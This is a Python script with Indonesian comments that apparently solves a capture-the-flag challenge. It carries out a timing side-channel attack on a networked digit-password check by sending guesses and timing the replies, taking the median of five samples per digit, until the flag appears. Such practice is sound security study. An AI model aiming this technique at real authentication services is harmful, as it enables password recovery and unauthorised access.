import socket
import time
from statistics import median

HOST = "chals3.apoorvctf.xyz"
PORT = 9001
CHARSET = "0123456789"
SAMPLES = 5 # Kita ambil sampel 5 kali per angka biar nggak ketipu lag jaringan

def solve():
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.connect((HOST, PORT))
    
    # Tangkap banner awal
    s.recv(1024)
    
    known_password = ""
    print("[*] Memulai Timing Attack...")
    
    while True:
        print(f"\n[*] Mencari angka ke-{len(known_password)+1}...")
        best_char = ""
        max_time = 0
        
        for c in CHARSET:
            times = []
            for _ in range(SAMPLES):
                guess = known_password + c
                
                start_time = time.perf_counter()
                s.sendall((guess + '\n').encode())
                
                resp = s.recv(1024).decode()
                end_time = time.perf_counter()
                
                # Kalau kata "Incorrect" nggak ada di balasan, berarti kita dapet flag!
                if "Incorrect" not in resp:
                    print(f"\n[SUCCESS] Flag atau balasan akhir: {resp.strip()}")
                    return
                
                times.append(end_time - start_time)
                
            # Kita pakai median (nilai tengah) buat menghindari noise/lag tiba-tiba
            med_time = median(times)
            print(f"[+] Tebak: {guess} | Waktu Median: {med_time:.5f} detik")
            
            if med_time > max_time:
                max_time = med_time
                best_char = c
                
        known_password += best_char
        print(f"[!] Angka terpilih: {best_char} (Password Sementara: {known_password})")

if __name__ == "__main__":
    solve()
